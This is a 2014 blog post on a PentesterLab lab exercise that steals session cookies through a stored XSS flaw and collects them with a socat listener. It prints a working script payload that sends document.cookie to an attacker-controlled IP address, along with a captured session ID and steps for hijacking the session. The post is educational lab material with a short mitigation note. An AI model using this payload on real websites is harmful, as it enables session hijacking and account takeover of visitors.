---
layout: post
title: Hijacking sessions using socat
date: '2014-02-11T10:23:00.001-07:00'
author: Sanjiv Kawa
tags:
- socat
- XSS
- Web Application
- netcat
- OWASP
- pentesterlabs
- session hijacking
- Penetration Testing
- cookie manager
comments: true
---

Recently I've been working through pentesterlabs <a href="https://pentesterlab.com/exercises/">exercises</a> to learn a bit more about identifying and exploiting security flaws in web applications.

During one of the labs I came across an awesome tool called <a href="http://freecode.com/projects/socat">socat</a> this tool has the ability to listen to multiple connections and act as a TCP relay port. Netcat does have similar functionality, however it will stop after the first connection, whereas socat will keep forking.

socat can be configured to echo HTTP GET requests, this is particularly useful if we want to view session cookies in the HTTP GET header.

Lets say we wanted to steal a session cookie from a victim, possibly even the administrator of a web page. A fairly common way to do this is to find a persistent XSS flaw in the web app. This is what we could do:

First locate the XSS flaw, then drop the following Script tag which write an Image tag to the web page.

{% highlight css %}
<script>document.write('<img src="http://192.168.117.129/?'+document.cookie+'"/>');</script>
{% endhighlight %}

When a victim visits the web page, the image tag will be loaded. The image tags URL grabs the victims cookie and as a result, it will be sent to the malicious server located at .129.

In the mean time on .129 we have an instance of socat running listening on port 80 for HTTP GET requests.

<figure>
  <center>
    <img src="https://4.bp.blogspot.com/-SR5TcGxQHJQ/UvpUmE6nKuI/AAAAAAAABho/Q-s-dDRqSXo/s1600/3.PNG">
  </center>
</figure>

The victims Session ID `qsp5uk0n9m6ctf568e928u5jc2` was passed along, and from here we can easily hijack their session using something like cookie manager:

<figure>
  <center>
    <img src="https://4.bp.blogspot.com/-zQZvV3Bwlw8/UvpVfFjc-8I/AAAAAAAABhw/l773AWWvHcg/s1600/4.PNG">
  </center>
</figure>

So, what can be done to <a href="http://tinyurl.com/bmmwzf">mitigate</a> this? Without getting overly technical good start would be to use secure/safe coding practices and implementing adequate XSS filters.

Ultimately, using Image tags to grab Session ID's isn't exactly new, in fact, most modern web pages have decent XSS filters in place to prevent users sessions from getting hijacked. The whole point of this was just to show you how cool socat is and what could happen if there is an XSS vulnerability on your web site.
